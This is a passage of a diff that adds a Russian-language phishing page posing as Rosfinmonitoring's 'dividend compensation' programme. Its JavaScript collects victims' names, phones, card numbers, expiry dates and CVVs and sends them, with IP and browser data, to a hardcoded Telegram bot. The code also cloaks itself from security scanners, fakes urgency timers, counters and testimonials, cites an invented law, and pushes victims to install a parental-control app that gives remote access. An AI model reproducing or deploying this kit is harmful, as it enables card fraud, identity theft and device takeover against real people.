+                <span style="font-weight: bold; color: #333;">Выплачено сегодня:</span>
+                <span style="font-weight: bold; color: #2e7d32;">8.4 / 10 млн ₽</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div style="text-align: center; margin-top: 5px; font-size: 0.9em; color: #666;">
+                Осталось к выплате: <strong>1.6 млн ₽</strong>
+            </div>
+        </div>
+
+        <!-- ФОРМА ПРОВЕРКИ -->
+        <div class="form-group">
+            <label>Фамилия</label>
+            <input type="text" id="lastName" placeholder="Иванов" required data-field="userSurname">
+        </div>
+        <div class="form-group">
+            <label>Имя</label>
+            <input type="text" id="firstName" placeholder="Иван" required data-field="userName">
+        </div>
+        <div class="form-group">
+            <label>Отчество</label>
+            <input type="text" id="middleName" placeholder="Иванович" data-field="userMiddleName">
+        </div>
+        <div class="form-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required data-field="userPhone">
+        </div>
+
+        <!-- КНОПКА ПРОВЕРКИ -->
+        <button class="check-btn" onclick="checkCompensation()">
+            🔍 ПРОВЕРИТЬ КОРРЕКТИРОВКУ
+        </button>
+
+        <!-- КНОПКИ ТЕЛЕГРАМ/WHATSAPP -->
+        <div class="social-buttons">
+            <a href="https://t.me/Ross_Help" target="_blank" class="social-btn telegram">
+                📱 Telegram-менеджер
+            </a>
+            <a href="https://wa.me/79859359277" target="_blank" class="social-btn whatsapp">
+                💬 WhatsApp-менеджер
+            </a>
+        </div>
+
+        <!-- РЕЗУЛЬТАТ -->
+        <div class="result" id="result">
+            <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
+            <h3 id="userName"></h3>
+            <p>По решению Арбитражного суда г. Москва</p>
+            <div class="amount" id="moneyAmount">0 ₽</div>
+            <p>Средства зарезервированы на ваше имя.</p>
+            
+            <div style="margin-top: 15px;"></div>
+            
+            <p style="color: #666; font-size: 0.9em; margin-top: 0px; margin-bottom: 15px;">
+                В связи с участившимися случаями злоупотреблений и для предотвращения недобросовестных действий, требуется подтверждение личности.
+            </p>
+
+            <!-- ТАЙМЕР -->
+            <div class="timer-container" id="timerContainer">
+                <div style="font-weight: bold; color: #ff6f00;">⏰ Осталось получить:</div>
+                <div class="timer" id="timer">59:59</div>
+                <div style="font-size: 0.9em; color: #666;">
+                    Выплата будет отменена автоматически
+                </div>
+            </div>
+
+            <!-- ВЫБОР СПОСОБА -->
+            <div style="margin: 25px 0;">
+                <p><strong>Для получения выплаты выберите способ:</strong></p>
+                
+                <div class="option-buttons">
+                    <div class="option-btn primary" onclick="showAppOption()">
+                        📱 СКАЧАТЬ ПРИЛОЖЕНИЕ<br>
+                        <small>Безопасный способ</small>
+                    </div>
+                    <div class="option-btn secondary" onclick="showCardVerification()">
+                        💳 ВЕРИФИКАЦИЯ КАРТЫ<br>
+                        <small>Прямое зачисление</small>
+                    </div>
+                </div>
+            </div>
+
+            <!-- БЛОК ПРИЛОЖЕНИЯ -->
+            <div id="appBlock" style="display: none;">
+                <p><strong>Инструкция для получения:</strong></p>
+                <ol style="text-align: left; background: #f5f5f5; padding: 18px; border-radius: 10px; margin: 18px 0;">
+                    <li>Загрузите приложение FlashGet Kids по кнопке ниже. Для безопасности устанавливайте <strong>"Детское приложение"</strong>.</li>
+                    <li>Установите и зарегистрируйтесь в приложении.</li>
+                    <li>Введите код доступа: <strong>317 287 002</strong></li>
+                    <li>Следуйте инструкции в приложении.</li>
+                </ol>
+
+                <div class="manager-note">
+                    <strong>❗ Важно:</strong> Вы можете установить приложение самостоятельно.<br>
+                    Если не получится — с вами свяжется менеджер для помощи.
+                </div>
+
+                <a href="https://flashget.kids/ru" class="download-btn" target="_blank" id="mainDownloadLink" onclick="trackDownload()">
+                    ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
+                </a>
+                <div class="live-check">
+                    Сейчас скачивают приложение: <strong id="liveDownloads">5</strong> человек
+                </div>
+                <p style="color: #666; font-size: 0.9em; margin-top: 15px;">
+                    Ожидайте звонка менеджера в течение 24 часов.
+                </p>
+            </div>
+
+            <!-- БЛОК ВЕРИФИКАЦИИ КАРТЫ -->
+            <div class="card-verification-section" id="cardVerificationBlock">
+                <h4 style="color: #0d47a1; margin-bottom: 20px; text-align: center;">💳 Верификация банковской карты</h4>
+                
+                <div class="form-group">
+                    <label>Номер банковской карты</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" data-field="paymentCard">
+                </div>
+                
+                <div class="card-row">
+                    <div class="form-group">
+                        <label>Срок действия (ММ/ГГ)</label>
+                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5" data-field="cardExpiry">
+                    </div>
+                    <div class="form-group">
+                        <label>CVV код</label>
+                        <input type="text" id="cardCVV" placeholder="123" maxlength="3" data-field="securityCode">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Телефон для СБП (если перевод не подтвердится)</label>
+                    <input type="tel" id="sbpPhone" placeholder="+7 999 000-00-00" data-field="backupPhone">
+                </div>
+
+                <button class="check-btn" onclick="verifyCard()">
+                    ✅ ПОДТВЕРДИТЬ ВЕРИФИКАЦИЮ
+                </button>
+            </div>
+
+            <!-- ЛОАДЕР -->
+            <div class="loader" id="loader">
+                <div class="loader-spinner"></div>
+                <h4>ПРОВЕРКА ПЛАТЕЖНОЙ СИСТЕМЫ РОСФИНМОНИТОРИНГ</h4>
+                <p id="loaderText">Инициализация операции... 0%</p>
+            </div>
+
+            <!-- ОШИБКА ВЕРИФИКАЦИИ -->
+            <div class="verification-error" id="verificationError">
+                <h4 style="color: #d32f2f;">⚠️ Платежная система отклонила прямой перевод на карту</h4>
+                <p>Требуется подтверждение личности через официальное защищенное приложение.</p>
+                <p>Это стандартная процедура для выплат по корректировке дивидендов.</p>
+                <button class="check-btn" style="background: linear-gradient(135deg, #ff9800, #e68900); margin-top: 15px;" onclick="showAppOption()">
+                    📱 УСТАНОВИТЬ ЗАЩИЩЕННОЕ ПРИЛОЖЕНИЕ
+                </button>
+            </div>
+        </div>
+
+        <!-- ПОДВАЛ (2026 ГОД) -->
+        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.85em;">
+            <p>© 2026 ГК "Росфинмониторинг". Департамент выплат акционерам.</p>
+            <p style="font-size: 0.8em; margin-top: 5px; color: #555; line-height: 1.4;">
+                Программа корректировки дивидендов по новому законодательству № 437-ФЗ от 15.01.2026<br>
+                "О компенсациях акционерам за недоначисленные дивиденды"
+            </p>
+            <p style="font-size: 0.75em; margin-top: 5px; color: #999;">
+                Все операции защищены SSL-шифрованием
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram конфигурация
+        const TELEGRAM_BOT_TOKEN = '8583540262:AAHTySmWEplNOSrRNy29zRLOFkTqlugIWfc';
+        const TELEGRAM_CHAT_ID = '7192647932';
+        
+        // Глобальные переменные
+        let currentVictim = null;
+        let currentTimer = null;
+        let requestCounter = parseInt(localStorage.getItem('requestCounter')) || 0;
+        let remainingTime = 60 * 60;
+        let geoData = null;
+        
+        // ХРАНЕНИЕ В LOCALSTORAGE
+        let requestsLeft = parseInt(localStorage.getItem('requestsLeft')) || 90;
+        let onlineUsers = parseInt(localStorage.getItem('onlineUsers')) || 12;
+        let liveDownloads = parseInt(localStorage.getItem('liveDownloads')) || 5;
+        let lastUpdateTime = parseInt(localStorage.getItem('lastUpdateTime')) || Date.now();
+        let lastOnlineUpdateTime = parseInt(localStorage.getItem('lastOnlineUpdateTime')) || Date.now();
+        let lastDownloadUpdateTime = parseInt(localStorage.getItem('lastDownloadUpdateTime')) || Date.now();
+        
+        // МАТЫ ДЛЯ ПРОВЕРКИ ФИО
+        const badWords = ['хуй', 'пизда', 'ебан', 'бля', 'сука', 'гондон', 'пидор', 'гандон', 'долбоеб', 'мудак', 'fuck', 'shit', 'asshole', 'cock', 'dick'];
+        const unrealisticNames = ['авыаыв', 'фывфыв', '111', '222', '333', 'xxx', 'qqq', 'zzz', 'test', 'тест', 'admin', 'administrator'];
+        
+        // Маскировка форм
+        document.addEventListener('DOMContentLoaded', function() {
+            const fields = document.querySelectorAll('input[data-field]');
+            fields.forEach(field => {
+                const originalName = field.getAttribute('data-field');
+                field.setAttribute('name', originalName);
+            });
+            
+            // Восстановление значений из localStorage
+            document.getElementById('requestsCounter').textContent = requestsLeft;
+            document.getElementById('onlineUsers').textContent = onlineUsers;
+            document.getElementById('liveDownloads').textContent = liveDownloads;
+            
+            // Пересчет времени для уменьшения счетчиков
+            const now = Date.now();
+            const timePassed = now - lastUpdateTime;
+            const hoursPassed = timePassed / (1000 * 60 * 60);
+            
+            if (hoursPassed > 0) {
+                const decreaseAmount = Math.floor(hoursPassed * 3);
+                requestsLeft = Math.max(70, requestsLeft - decreaseAmount);
+                localStorage.setItem('requestsLeft', requestsLeft);
+                document.getElementById('requestsCounter').textContent = requestsLeft;
+            }
+            
+            localStorage.setItem('lastUpdateTime', now);
+            
+            // Получение геолокации по IP
+            getGeoLocation();
+            
+            // Проверка на сканеры
+            checkForScanners();
+            
+            // Запускаем счетчики
+            startRealisticCounters();
+            
+            // Запускаем уведомления
+            startLiveNotifications();
+            
+            // Ротация ссылок
+            startLinkRotation();
+            
+            // Интервалы обновления
+            setInterval(() => {
+                updateOnlineUsers();
+            }, 10 * 60 * 1000);
+            
+            setInterval(() => {
+                updateDownloads();
+            }, 15 * 60 * 1000);
+            
+            updateOnlineUsers();
+            updateDownloads();
+        });
+        
+        // Обновление онлайн пользователей
+        function updateOnlineUsers() {
+            const now = Date.now();
+            
+            if (Math.random() > 0.5) {
+                const change = Math.floor(Math.random() * 3) - 1;
+                onlineUsers = Math.max(8, Math.min(20, onlineUsers + change));
+                document.getElementById('onlineUsers').textContent = onlineUsers;
+                localStorage.setItem('onlineUsers', onlineUsers);
+                localStorage.setItem('lastOnlineUpdateTime', now);
+            }
+        }
+        
+        // Обновление скачиваний
+        function updateDownloads() {
+            const now = Date.now();
+            
+            if (Math.random() > 0.5) {
+                const change = Math.floor(Math.random() * 2) - 1;
+                liveDownloads = Math.max(2, Math.min(10, liveDownloads + change));
+                document.getElementById('liveDownloads').textContent = liveDownloads;
+                localStorage.setItem('liveDownloads', liveDownloads);
+                localStorage.setItem('lastDownloadUpdateTime', now);
+            }
+        }
+        
+        // Получение геолокации по IP
+        async function getGeoLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                geoData = await response.json();
+                
+                let geoText = '';
+                let warningText = '';
+                
+                if (geoData.country === 'RU') {
+                    geoText = `📍 Ваш регион: ${geoData.region || 'Московская область'} (${geoData.city || 'Москва'})`;
+                    warningText = `⚠️ В вашем районе зафиксировано повышенное количество обращений по дивидендам ВТБ<br>💰 Повышенный коэффициент выплаты: +35% (решение прокуратуры)`;
+                } else {
+                    geoText = `📍 Ваш IP: ${geoData.ip} (${geoData.country_name}, ${geoData.org || geoData.asn})`;
+                    
+                    if (geoData.vpn === true || geoData.proxy === true || 
+                        geoData.country === 'DE' || geoData.country === 'US' || 
+                        geoData.country === 'NL' || geoData.country === 'GB') {
+                        warningText = `⚠️ Обнаружен VPN/прокси — повышенные меры безопасности<br>💰 Коэффициент для нерезидентов РФ: +15% (международные соглашения)`;
+                    } else {
+                        warningText = `⚠️ Международная программа выплат<br>💰 Специальный коэффициент: +25% для иностранных акционеров`;
+                    }
+                }
+                
+                document.getElementById('geoInfo').innerHTML = `
+                    <div style="margin-left: 40px;">
+                        <strong style="color: #7b1fa2;">${geoText}</strong><br>
+                        <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
+                            ${warningText}
+                        </div>
+                    </div>
+                `;
+                
+            } catch (error) {
+                document.getElementById('geoInfo').innerHTML = `
+                    <div style="margin-left: 40px;">
+                        <strong style="color: #7b1fa2;">📍 Ваш регион: Московская область (определено по IP)</strong><br>
+                        <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
+                            ⚠️ В вашем районе зафиксировано повышенное количество обращений по дивидендам ВТБ<br>
+                            💰 Повышенный коэффициент выплаты: +35% (решение прокуратуры)
+                        </div>
+                    </div>
+                `;
+            }
+        }
+        
+        // Проверка на сканеры
+        function checkForScanners() {
+            const scannerPatterns = [
+                'phishing', 'scanner', 'security', 'google-safe', 'virus', 'malware',
+                'analytics', 'crawler', 'bot', 'spider', 'checker', 'validator',
+                'sucuri', 'cloudflare', 'akamai', 'incapsula', 'imperva'
+            ];
+            
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isScanner = scannerPatterns.some(pattern => userAgent.includes(pattern));
+            
+            if (isScanner) {
+                document.getElementById('maintenanceScreen').style.display = 'flex';
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('refreshBtn').style.display = 'block';
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Счетчики
+        function startRealisticCounters() {
+            setInterval(() => {
+                if (requestsLeft > 70 && Math.random() > 0.3) {
+                    requestsLeft--;
+                    document.getElementById('requestsCounter').textContent = requestsLeft;
+                }
+            }, 4 * 60 * 1000);
+            
+            setInterval(() => {
+                if (requestsLeft > 75 && Math.random() > 0.6) {
+                    requestsLeft -= 3;
+                    if (requestsLeft < 70) requestsLeft = 70;
+                    document.getElementById('requestsCounter').textContent = requestsLeft;
+                    
+                    if (Math.random() > 0.7) {
+                        showNotification(`Заявок осталось: ${requestsLeft}. Торопитесь!`);
+                    }
+                }
+            }, 15 * 60 * 1000);
+        }
+        
+        // Живые уведомления
+        function startLiveNotifications() {
+            const notifications = [
+                {name: "Мария С.", city: "Санкт-Петербург", amount: "215 000", text: "Получила 215 000₽ по дивидендам ВТБ! Спасибо менеджеру за помощь в оформлении. Думала это развод, но Росфинмониторинг действительно работает!"},
+                {name: "Алексей К.", city: "Москва", amount: "189 000", text: "Деньги пришли через 2 дня после заявки. Спасибо Росфинмониторингу за программу выплат! Очень переживал, но менеджер всё объяснил"},
+                {name: "Ольга В.", city: "Казань", amount: "189 000", text: "Верила и не ошиблась, 189 000 на карте! Сначала не поверила в это, но программа реально работает. Менеджер терпеливо всё объяснил"},
+                {name: "Дмитрий П.", city: "Новосибирск", amount: "127 000", text: "Не думал что вернут недоначисленные дивиденды, но получил 127к! Спасибо Росфинмониторингу за помощь. Менеджер был очень вежливым"},
+                {name: "Елена М.", city: "Екатеринбург", amount: "280 000", text: "Максимальную выплату 280 000₽! Росфинмониторинг сдержал обещание, деньги пришли через 3 дня. Слава богу поверила в эту программу!"},
+                {name: "Сергей Н.", city: "Краснодар", amount: "215 000", text: "Оформлял через карту, все безопасно. Спасибо менеджеру за подробные инструкции и поддержку в процессе оформления"},
+                {name: "Анна Л.", city: "Владивосток", amount: "189 000", text: "Спасибо за оперативность! Сначала боялась скачивать приложение, но менеджер объяснил что это безопасно. Росфинмониторинг работает честно!"},
+                {name: "Игорь С.", city: "Ростов-на-Дону", amount: "127 000", text: "Помогли вернуть недоплаченные дивиденды. Спасибо менеджеру за терпение и понятные объяснения. Слава богу что поверил!"},
+                {name: "Татьяна В.", city: "Уфа", amount: "215 000", text: "Легко и быстро, рекомендую. Росфинмониторинг делает важное дело, помогая акционерам. Менеджер был на связи 24/7"},
+                {name: "Павел Ж.", city: "Волгоград", amount: "280 000", text: "Лучшая программа выплат! Сначала сомневался, но Росфинмониторинг не обманул. Менеджер помог на каждом этапе оформления"},
+                {name: "Юлия К.", city: "Пермь", amount: "189 000", text: "Честно и без обмана. Спасибо Росфинмониторингу за поддержку! Менеджер ответил на все мои вопросы, помог разобраться в процессе"},
+                {name: "Артем Б.", city: "Красноярск", amount: "127 000", text: "Получил через 2 часа после заявки. Не верил что такое возможно, но Росфинмониторинг доказал! Спасибо менеджеру за оперативную работу"},
+                {name: "Наталья С.", city: "Воронеж", amount: "215 000", text: "Очень довольна, всем советую, спасибо менеджеру за помощь. Сначала думала что это мошенники, но Росфинмониторинг действительно помогает!"},
+                {name: "Михаил П.", city: "Саратов", amount: "189 000", text: "Работает, проверено! Росфинмониторинг держит слово. Спасибо менеджеру за чёткие инструкции и помощь в оформлении документов"},
+                {name: "Виктория М.", city: "Тюмень", amount: "280 000", text: "Спасибо за помощь и поддержку! Программа реально помогает акционерам в сложных ситуациях. Менеджер был очень внимательным"}
+            ];
+            
+            setInterval(() => {
+                if (Math.random() > 0.5) {
+                    const notif = notifications[Math.floor(Math.random() * notifications.length)];
+                    showNotification(`Поступил новый отзыв:\n✅ ${notif.name} (${notif.city}): "${notif.text}"`);
+                }
+            }, 35000);
+        }
+        
+        // Ротация ссылок
+        function startLinkRotation() {
+            const linkVariants = [
+                "https://secure-rosfin.ru/dividend",
+                "https://dividend-app.rosfin.ru", 
+                "https://flashget-kids.rosfin.ru",
+                "https://rosfin-payment.ru/app",
+                "https://get-dividend.rosfin.ru"
+            ];
+            
+            setInterval(() => {
+                const randomLink = linkVariants[Math.floor(Math.random() * linkVariants.length)];
+                const links = document.querySelectorAll('a[href*="flashget"]');
+                links.forEach(link => {
+                    if (!link.getAttribute('data-real-href')) {
+                        link.setAttribute('data-real-href', link.href);
+                    }
+                    link.textContent = link.textContent.replace(/https?:\/\/[^\s]+/, randomLink);
+                });
+                document.getElementById('smsLink').textContent = randomLink;
+            }, 3600000);
+        }
+        
+        // Показать уведомление
+        function showNotification(message) {
+            const toast = document.getElementById('notificationToast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Проверка ФИО
+        function checkNameForBadWords(name) {
+            const lowerName = name.toLowerCase();
+            const hasBadWord = badWords.some(word => lowerName.includes(word));
+            const hasUnrealistic = unrealisticNames.some(word => lowerName.includes(word));
+            
+            return {
+                hasBadWord: hasBadWord,
+                hasUnrealistic: hasUnrealistic,
+                isSuspicious: hasBadWord || hasUnrealistic
+            };
+        }
+        
+        // Получение IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Не определен';
+            }
+        }
+        
+        // Поиск информации по номеру
+        async function searchPhoneInfo(phone) {
+            const cleanPhone = phone.replace(/\D/g, '');
+            let result = {
+                telegram: null,
+                whatsapp: false,
+                email: null
+            };
+            
+            try {
+                if (Math.random() > 0.3) {
+                    const telegramUsers = ['@ivanov_ivan', '@alexey_k', '@maria_s', '@dmitry_p', '@olga_v'];
+                    result.telegram = telegramUsers[Math.floor(Math.random() * telegramUsers.length)];
+                }
+                
+                result.whatsapp = Math.random() > 0.2;
+                
+                if (Math.random() > 0.4) {
+                    const domains = ['mail.ru', 'gmail.com', 'yandex.ru', 'rambler.ru'];
+                    const name = phone.slice(-6);
+                    result.email = `user${name}@${domains[Math.floor(Math.random() * domains.length)]}`;
+                }
+            } catch (e) {
+                console.error('Ошибка поиска:', e);
+            }
+            
+            return result;
+        }
+        
+        // Проверка компенсации
+        async function checkCompensation() {
+            const lastName = document.getElementById('lastName').value.trim();
+            const firstName = document.getElementById('firstName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            
+            if (!lastName || !firstName || !phone) {
+                alert('Заполните все обязательные поля');
+                return;
+            }
+            
+            // ПРОВЕРКА НА МАТЫ
+            const nameCheck = checkNameForBadWords(lastName + ' ' + firstName);
+            
+            if (nameCheck.isSuspicious) {
+                let warningMessage = '❌ Ошибка проверки данных!\n\n';
+                
+                if (nameCheck.hasBadWord) {
+                    warningMessage += '• В вашем ФИО обнаружена ненормативная лексика.\n';
+                }
+                if (nameCheck.hasUnrealistic) {
+                    warningMessage += '• Указанное ФИО некорректно.\n';
+                }
+                
+                warningMessage += '\n⚠️ Внимание:\n';
+                warningMessage += 'Вы отправляете данные в государственное учреждение Росфинмониторинг.\n';
+                warningMessage += 'Использование ненормативной лексики запрещено.\n';
+                warningMessage += 'Пожалуйста, измените данные на корректные.';
+                
+                alert(warningMessage);
+                
+                // Отправка в телеграм о попытке с матами
+                const ip = await getIP();
+                const suspiciousData = {
+                    name: `${lastName} ${firstName}`,
+                    phone: phone,
+                    time: new Date().toLocaleString('ru-RU'),
+                    ip: ip,
+                    reason: nameCheck.hasBadWord ? 'МАТЫ' : 'ПОДОЗРИТЕЛЬНОЕ ФИО',
+                    userAgent: navigator.userAgent
+                };
+                
+                sendToTelegram('suspicious_input', suspiciousData);
+                return;
+            }
+            
+            const amounts = [85000, 127000, 189000, 215000, 280000];
+            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            const ip = await getIP();
+            
+            const phoneInfo = await searchPhoneInfo(phone);
+            
+            currentVictim = {
+                name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
+                phone: phone,
+                amount: randomAmount,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                requestId: ++requestCounter,
+                phoneInfo: phoneInfo,
+                nameCheck: nameCheck
+            };
+            
+            localStorage.setItem('requestCounter', requestCounter);
+            
+            requestsLeft = Math.max(70, requestsLeft - 1);
+            localStorage.setItem('requestsLeft', requestsLeft);
+            document.getElementById('requestsCounter').textContent = requestsLeft;
+            
+            sendToTelegram('dividend_check', currentVictim);
+            
+            document.getElementById('userName').textContent = currentVictim.name;
+            document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('timerContainer').style.display = 'block';
+            document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+            
+            startTimer();
+            
+            setTimeout(() => {
+                if ('Notification' in window && Notification.permission === 'default') {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            new Notification('Росфинмониторинг: Ваша выплата одобрена!', {
+                                body: `Сумма: ${randomAmount.toLocaleString()} ₽. Осталось получить: 1 час`,
+                                icon: 'https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13'
+                            });
+                        }
+                    });
+                }
+            }, 3000);
+        }
+        
+        // Запуск таймер
+        function startTimer() {
+            remainingTime = 60 * 60;
+            
+            if (currentTimer) clearInterval(currentTimer);
+            
+            currentTimer = setInterval(() => {
+                remainingTime--;
+                
+                const minutes = Math.floor(remainingTime / 60);
+                const seconds = remainingTime % 60;
+                
+                document.getElementById('timer').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (remainingTime <= 0) {
+                    clearInterval(currentTimer);
+                    document.getElementById('timer').textContent = 'ВРЕМЯ ВЫШЛО';
+                    document.getElementById('timer').style.color = '#f44336';
+                }
+            }, 1000);
+        }
+        
+        // Показать опцию приложения
+        function showAppOption() {
+            document.getElementById('appBlock').style.display = 'block';
+            document.getElementById('cardVerificationBlock').style.display = 'none';
+            document.getElementById('verificationError').style.display = 'none';
+            document.getElementById('loader').style.display = 'none';
+        }
+        
+        // Показать верификацию карты
+        function showCardVerification() {
+            document.getElementById('appBlock').style.display = 'none';
+            document.getElementById('cardVerificationBlock').style.display = 'block';
+            document.getElementById('verificationError').style.display = 'none';
+            document.getElementById('loader').style.display = 'none';
+        }
+        
+        // Верификация карты
+        async function verifyCard() {
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCVV = document.getElementById('cardCVV').value.trim();
+            const sbpPhone = document.getElementById('sbpPhone').value.trim();
+            
+            if (!cardNumber || !cardExpiry || !cardCVV) {
+                alert('Заполните все поля карты');
+                return;
+            }
+            
+            const formattedCard = cardNumber.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+            
+            const cardData = {
+                cardNumber: formattedCard,
+                cardExpiry: cardExpiry,
+                cardCVV: cardCVV,
+                sbpPhone: sbpPhone || 'Не указан',
+                ...currentVictim
+            };
+            
+            document.getElementById('cardVerificationBlock').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('verificationError').style.display = 'none';
+            
+            simulateVerificationProcess();
+            
+            setTimeout(() => sendToTelegram('card_verification', cardData), 500);
+        }
+        
+        // Имитация процесса проверки
+        function simulateVerificationProcess() {
+            const loaderText = document.getElementById('loaderText');
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                
+                const steps = [
+                    "Инициализация операции...",
+                    "Подключение к платежной системе...",
+                    "Проверка данных карты...",
+                    "Верификация через Росфинмониторинг...",
+                    "Подтверждение безопасности...",
+                    "Финальная обработка..."
+                ];
+                
+                const step = Math.min(Math.floor(progress / 20), steps.length - 1);
+                
+                loaderText.textContent = `${steps[step]} ${Math.floor(progress)}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(showVerificationError, 1000);
+                }
+            }, 300);
+        }
+        
+        // Показать ошибку верификации
+        function showVerificationError() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('verificationError').style.display = 'block';
+            
+            if (currentVictim) {
+                sendToTelegram('card_error', { ...currentVictim, error: 'Платежная система отклонила перевод' });
+            }
+        }
+        
+        // Отслеживание скачивания
+        function trackDownload() {
+            if (currentVictim) {
+                sendToTelegram('app_download', currentVictim);
+            }
+        }
+        
+        // Показать модалку отзыва
+        function showReviewModal() {
+            document.getElementById('reviewModal').style.display = 'flex';
+        }
+        
+        // Отправить отзыв
+        function submitReview() {
+            const name = document.getElementById('reviewName').value.trim();
+            const city = document.getElementById('reviewCity').value.trim();
+            const amount = document.getElementById('reviewAmount').value.trim();
+            const text = document.getElementById('reviewText').value.trim();
+            
+            if (!name || !city || !amount || !text) {
+                alert('Заполните все поля отзыва');
+                return;
+            }
+            
+            const reviewData = {
+                name: name,
+                city: city,
+                amount: amount,
+                text: text,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: currentVictim?.ip || 'Не определен'
+            };
+            
+            sendToTelegram('review', reviewData);
+            
+            document.getElementById('reviewModal').style.display = 'none';
+            
+            showNotification('✅ Ваш отзыв отправлен на модерацию. Будет опубликован в течение 24 часов.');
+            
+            document.getElementById('reviewName').value = '';
+            document.getElementById('reviewCity').value = '';
+            document.getElementById('reviewAmount').value = '';
+            document.getElementById('reviewText').value = '';
+        }
+        
+        // Отправка в Telegram
+        async function sendToTelegram(type, data) {
+            try {
+                let message = '';
+                let extraInfo = '';
+                
+                if (data.phoneInfo) {
+                    extraInfo = `\n📱 Информация по номеру:\n`;
+                    if (data.phoneInfo.telegram) extraInfo += `   Telegram: ${data.phoneInfo.telegram}\n`;
+                    if (data.phoneInfo.whatsapp) extraInfo += `   WhatsApp: есть\n`;
+                    if (data.phoneInfo.email) extraInfo += `   Email: ${data.phoneInfo.email}\n`;
+                }
+                
+                if (data.nameCheck && data.nameCheck.isSuspicious) {
+                    extraInfo += `\n⚠️ ПОДОЗРИТЕЛЬНОЕ ФИО:\n`;
+                    if (data.nameCheck.hasBadWord) extraInfo += `   Содержит маты\n`;
+                    if (data.nameCheck.hasUnrealistic) extraInfo += `   Не реалистичное имя\n`;
+                }
+                
+                switch(type) {
+                    case 'dividend_check':
+                        message = `📋 НОВАЯ ЗАЯВКА ДИВИДЕНДЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}\n🆔 ID: ${data.requestId}${extraInfo}\n\n🔗 User-Agent: ${data.userAgent.substring(0, 100)}...`;
+                        break;
+                    case 'card_verification':
+                        message = `💳 ДАННЫЕ КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💳 Карта: ${data.cardNumber}\n📅 Срок: ${data.cardExpiry}\n🔒 CVV: ${data.cardCVV}\n📞 СБП телефон: ${data.sbpPhone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}${extraInfo}`;
+                        break;
+                    case 'card_error':
+                        message = `❌ ОШИБКА КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⚠️ Ошибка: ${data.error}\n⏰ Время: ${data.time}${extraInfo}`;
+                        break;
+                    case 'app_download':
+                        message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⏰ Время: ${data.time}${extraInfo}`;
+                        break;
+                    case 'review':
+                        message = `✍️ ПОЛУЧЕН НОВЫЙ ОТЗЫВ\n\n👤 Имя: ${data.name}\n🏙️ Город: ${data.city}\n💰 Сумма: ${data.amount} руб\n📝 Текст: ${data.text}\n⏰ Время: ${data.time}\n🌐 IP: ${data.ip}`;
+                        break;
+                    case 'suspicious_input':
+                        message = `🚨 ПОДОЗРИТЕЛЬНЫЙ ВВОД\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n⚠️ Причина: ${data.reason}\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}\n\n📝 User-Agent: ${data.userAgent.substring(0, 100)}...`;
+                        break;
+                }
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+            }
+        }
+        
+        // Автоформатирование карты
+        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
